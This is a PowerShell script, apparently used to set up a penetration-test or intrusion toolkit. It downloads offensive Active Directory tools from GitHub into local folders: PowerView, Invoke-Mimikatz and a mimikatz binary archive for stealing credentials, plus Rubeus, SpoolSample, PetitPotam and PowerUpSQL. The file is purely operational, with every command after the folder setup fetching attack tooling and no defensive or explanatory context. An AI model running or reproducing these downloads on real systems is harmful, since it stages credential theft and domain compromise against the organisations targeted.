mkdir Tools
mkdir .\Tools\Enumerate
mkdir .\Tools\Credentials 

# Maybe needded
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ENUMERATION
# ===========
# PowerView
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile .\PowerView.ps1

# CREDENTIALS
# ===========
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" -OutFile .\Invoke-Mimikatz.ps1
Invoke-WebRequest -Uri "https://github.com/caday00/mimikatz2.1.1/raw/master/mimikatz_trunk.zip" -OutFile .\mimikatz.zip

# MULTI PURPOUSE
# ==============
# Rubeus
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Rubeus.exe" -OutFile .\Rubeus.exe

# Unconstrained delegation
Invoke-WebRequest -Uri "https://github.com/jtmpu/PrecompiledBinaries/raw/master/SpoolSample.exe" -OutFile .\SpoolSample.exe
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.exe" -OutFile .\PetitPotam.exe

# MSSQL
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1" -OutFile .\PowerUpSQL.ps1